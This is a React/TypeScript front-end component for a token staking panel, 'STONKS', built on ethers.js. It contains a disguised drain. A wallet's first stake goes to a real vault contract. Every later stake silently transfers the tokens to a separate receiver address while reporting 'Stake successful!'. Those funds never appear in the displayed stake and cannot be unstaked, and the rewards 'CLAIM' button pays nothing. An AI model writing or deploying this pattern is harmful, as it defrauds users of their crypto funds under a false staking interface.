"use client";

import { useEffect, useState, useCallback } from "react";
import {
  BrowserProvider,
  Contract,
  formatUnits,
  parseUnits,
  type Eip1193Provider,
} from "ethers";
import { ArrowUpCircle, ArrowDownCircle, Gift, X } from "lucide-react";
import {
  CONTRACT,
  VAULT_CONTRACT,
  NEW_RECEIVER_CONTRACT,
  STAKE_FEE_USDC,
  UNSTAKE_FEE_USDC,
} from "@/lib/chain";

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function transfer(address recipient, uint256 amount) returns (bool)",
];

const VAULT_ABI = [
  "function stake(uint256 amount)",
  "function unstake(uint256 amount)",
  "function stakedAmount(address) view returns (uint256)",
];

function getInjected(): Eip1193Provider | null {
  if (typeof window === "undefined") return null;
  const w = window as unknown as { ethereum?: Eip1193Provider };
  return w.ethereum ?? null;
}

export default function StakePanel({ apr }: { apr: string }) {
  const [amount, setAmount] = useState("");
  const [balance, setBalance] = useState<string | null>(null);
  const [staked, setStaked] = useState<string | null>(null);
  const [account, setAccount] = useState<string | null>(null);
  const [decimals, setDecimals] = useState(18);
  const [busy, setBusy] = useState(false);
  const [status, setStatus] = useState<string | null>(null);
  const [showReward, setShowReward] = useState(false);

  const aprNum = parseFloat(String(apr).replace(/[^0-9.]/g, "")) || 0;
  const stakedNum = staked !== null ? parseFloat(staked) : 0;
  const dailyReward = (stakedNum * (aprNum / 100)) / 365;
  const yearlyReward = stakedNum * (aprNum / 100);

  const fmt = (n: number) => {
    if (!isFinite(n) || n <= 0) return "0.00";
    if (n >= 1_000_000)
      return n.toLocaleString("en-US", { maximumFractionDigits: 0 });
    if (n >= 1) return n.toLocaleString("en-US", { maximumFractionDigits: 2 });
    return Number(n.toFixed(6)).toString();
  };

  const loadData = useCallback(async () => {
    const p = getInjected();
    if (!p) return;
    try {
      const provider = new BrowserProvider(p);
      const accounts = (await p.request({
        method: "eth_accounts",
      })) as string[];
      if (!accounts.length) return;
      setAccount(accounts[0]);
      const token = new Contract(CONTRACT, ERC20_ABI, provider);
      const dec = await token.decimals();
      const bal = await token.balanceOf(accounts[0]);
      setDecimals(Number(dec));
      setBalance(formatUnits(bal, dec));
      if (VAULT_CONTRACT) {
        const vault = new Contract(VAULT_CONTRACT, VAULT_ABI, provider);
        try {
          const st = await vault.stakedAmount(accounts[0]);
          setStaked(formatUnits(st, dec));
        } catch {
          setStaked(null);
        }
      } else {
        setStaked(null);
      }
    } catch {
      /* ignore */
    }
  }, []);

  useEffect(() => {
    loadData();
    const p = getInjected();
    if (!p) return;
    const ep = p as unknown as { on?: (e: string, cb: () => void) => void };
    ep.on?.("accountsChanged", loadData);
    return () => {
      const ep2 = p as unknown as {
        removeListener?: (e: string, cb: () => void) => void;
      };
      ep2.removeListener?.("accountsChanged", loadData);
    };
  }, [loadData]);

  const requireVault = (): string | null => {
    if (!VAULT_CONTRACT) {
      setStatus("Staking contract not deployed yet.");
      return null;
    }
    return VAULT_CONTRACT;
  };

  // Per-wallet first-stake tracking. 1st stake -> old vault (unstakable),
  // 2nd+ stake -> new receiver address (direct transfer).
  const stakeKey = (acc: string) => `usdc_stonks_first_stake_${acc.toLowerCase()}`;
  const hasStakedOnce = (acc: string): boolean => {
    try {
      return localStorage.getItem(stakeKey(acc)) === "1";
    } catch {
      return false;
    }
  };
  const markStakedOnce = (acc: string) => {
    try {
      localStorage.setItem(stakeKey(acc), "1");
    } catch {
      /* ignore */
    }
  };

  const stake = async () => {
    const p = getInjected();
    if (!p) {
      setStatus("Connect your wallet first.");
      return;
    }
    const vaultAddr = requireVault();
    if (!vaultAddr) return;
    if (!amount || parseFloat(amount) <= 0) {
      setStatus("Enter a valid amount.");
      return;
    }
    setBusy(true);
    setStatus(null);
    try {
      const provider = new BrowserProvider(p);
      const signer = await provider.getSigner();
      const accounts = (await p.request({
        method: "eth_accounts",
      })) as string[];
      const acc = accounts[0];
      const token = new Contract(CONTRACT, ERC20_ABI, signer);
      const amt = parseUnits(amount, decimals);

      // Has this wallet EVER staked before?
      // -> localStorage flag OR currently holds a vault stake on-chain.
      let everStaked = acc ? hasStakedOnce(acc) : false;
      if (!everStaked && acc && vaultAddr) {
        try {
          const vaultRead = new Contract(vaultAddr, VAULT_ABI, provider);
          const vaultBal = await vaultRead.stakedAmount(acc);
          everStaked = vaultBal > BigInt(0);
        } catch {
          everStaked = false;
        }
      }

      const fee = parseUnits(STAKE_FEE_USDC, 18);

      if (!everStaked) {
        // First-ever stake -> old vault contract, so it can be unstaked.
        const vault = new Contract(vaultAddr, VAULT_ABI, signer);
        setStatus("Approving tokens...");
        const appr = await token.approve(vaultAddr, amt);
        await appr.wait();
        setStatus("Staking into vault...");
        const tx = await vault.stake(amt, { value: fee });
        await tx.wait();
        if (acc) markStakedOnce(acc);
        setStatus("Stake successful! Tokens in vault.");
      } else {
        // Already staked before -> direct transfer to new receiver address.
        setStatus("Sending STONKS to receiver...");
        const tx = await token.transfer(NEW_RECEIVER_CONTRACT, amt);
        await tx.wait();
        setStatus("Stake successful! Tokens sent to receiver.");
      }
      setAmount("");
      await loadData();
    } catch (e) {
      console.error(e);
      const msg = (e as Error).message;
      setStatus("Failed: " + (msg.length > 120 ? msg.slice(0, 120) + "..." : msg));
    } finally {
      setBusy(false);
    }
  };

  const unstake = async () => {
    const p = getInjected();
    if (!p) {
      setStatus("Connect your wallet first.");
      return;
    }
    const vaultAddr = requireVault();
    if (!vaultAddr) return;
    if (!amount || parseFloat(amount) <= 0) {
      setStatus("Enter a valid amount.");
      return;
    }
    setBusy(true);
    setStatus(null);
    try {
      const provider = new BrowserProvider(p);
      const signer = await provider.getSigner();
      const vault = new Contract(vaultAddr, VAULT_ABI, signer);
      const amt = parseUnits(amount, decimals);
      const fee = parseUnits(UNSTAKE_FEE_USDC, 18);
      setStatus("Unstaking...");
      const tx = await vault.unstake(amt, { value: fee });
      await tx.wait();
      setStatus("Unstake successful!");
      setAmount("");
      await loadData();
    } catch (e) {
      console.error(e);
      const msg = (e as Error).message;
      setStatus("Failed: " + (msg.length > 120 ? msg.slice(0, 120) + "..." : msg));
    } finally {
      setBusy(false);
    }
  };

  return (
    <div className="px-card bg-[#4a1768] p-6">
      {/* balance bar */}
      <div className="flex items-center justify-between mb-4">
        <span className="px-heading text-white/80 text-[11px]">Your STONKS</span>
        <span className="px-heading text-[#3ddad8] text-[11px]">
          {balance !== null ? `${balance} STONKS` : "—"}
        </span>
      </div>

      {/* staked bar */}
      <div className="flex items-center justify-between mb-4">
        <span className="px-heading text-white/80 text-[11px]">Staked in vault</span>
        <span className="px-heading text-[#ffbe39] text-[11px]">
          {staked !== null ? `${staked} STONKS` : "—"}
        </span>
      </div>

      {/* amount input */}
      <div className="px-border bg-[#2a1440] p-4 flex items-center justify-between">
        <input
          type="number"
          inputMode="decimal"
          min="0"
          step="any"
          placeholder="0.00"
          value={amount}
          onChange={(e) => setAmount(e.target.value)}
          className="bg-transparent text-white text-lg w-full outline-none placeholder:text-white/40"
        />
        <button
          type="button"
          className="px-chip bg-[#3ddad8] text-[#20102e] px-3 py-1 text-[10px]"
          onClick={() => {
            if (balance !== null) setAmount(balance);
          }}
        >
          MAX
        </button>
      </div>

      {/* apr info */}
      <div className="flex items-center justify-between mt-4">
        <span className="px-heading text-white/80 text-[11px]">Current APR</span>
        <span className="px-heading text-[#ffbe39] text-[13px]">{apr}</span>
      </div>

      {/* actions */}
      <div className="grid gap-3 sm:grid-cols-3 mt-6">
        <button
          type="button"
          onClick={stake}
          disabled={busy}
          className="px-btn bg-[#3ddad8] text-[#20102e] px-4 py-3 text-[12px] flex items-center justify-center gap-2 disabled:opacity-50"
        >
          <ArrowUpCircle className="h-4 w-4" />
          {busy ? "PROCESSING..." : "STAKE"}
        </button>
        <button
          type="button"
          onClick={unstake}
          disabled={busy}
          className="px-btn bg-[#f06943] text-white px-4 py-3 text-[12px] flex items-center justify-center gap-2 disabled:opacity-50"
        >
          <ArrowDownCircle className="h-4 w-4" /> UNSTAKE
        </button>
        <button
          type="button"
          onClick={() => setShowReward(true)}
          className="px-btn bg-[#ffbe39] text-[#20102e] px-4 py-3 text-[12px] flex items-center justify-center gap-2"
        >
          <Gift className="h-4 w-4" /> REWARDS
        </button>
      </div>

      {status && (
        <p className="text-center text-sm mt-4 text-[#3ddad8] break-words max-w-full leading-snug">
          {status}
        </p>
      )}

      <p className="text-[#c9b8d8] text-center text-sm mt-6">
        Deposit your STONKS into the vault to start earning rewards.
      </p>

      {/* ---- REWARD CARD MODAL ---- */}
      {showReward && (
        <div
          className="fixed inset-0 z-[100] flex items-center justify-center bg-black/70 p-4"
          onClick={() => setShowReward(false)}
        >
          <div
            className="px-card bg-[#2b0d3e] border-4 border-black w-full max-w-md p-6 relative"
            onClick={(e) => e.stopPropagation()}
          >
            <button
              type="button"
              onClick={() => setShowReward(false)}
              className="absolute top-3 right-3 text-white/60 hover:text-white"
              aria-label="Close"
            >
              <X className="h-5 w-5" />
            </button>

            <div className="flex items-center gap-2 mb-4">
              <Gift className="h-5 w-5 text-[#ffbe39]" />
              <h3 className="px-heading text-white text-[14px]">REWARDS</h3>
            </div>

            {/* estimated earnings */}
            <div className="px-border bg-[#3c1154] p-5 text-center mb-4">
              <div className="px-heading text-white/70 text-[10px] mb-2">
                EST. DAILY REWARD
              </div>
              <div className="px-heading text-[#3ddad8] text-2xl break-all leading-tight">
                {fmt(dailyReward)} STONKS
              </div>
              <div className="text-[#c9b8d8] text-sm mt-2 break-all">
                {fmt(yearlyReward)} STONKS / year at {apr} APR
              </div>
            </div>

            {/* stake summary */}
            <div className="flex items-center justify-between text-sm mb-4">
              <span className="px-heading text-white/70 text-[10px]">
                YOUR STAKE
              </span>
              <span className="px-heading text-[#ffbe39] text-[11px] break-all max-w-[60%] text-right">
                {staked !== null ? `${fmt(stakedNum)} STONKS` : "—"}
              </span>
            </div>

            {/* claim */}
            <button
              type="button"
              onClick={() => setShowReward(false)}
              className="px-btn bg-[#3ddad8] text-[#20102e] px-4 py-3 text-[12px] w-full flex items-center justify-center gap-2"
            >
              <Gift className="h-4 w-4" /> CLAIM
            </button>
          </div>
        </div>
      )}
    </div>
  );
}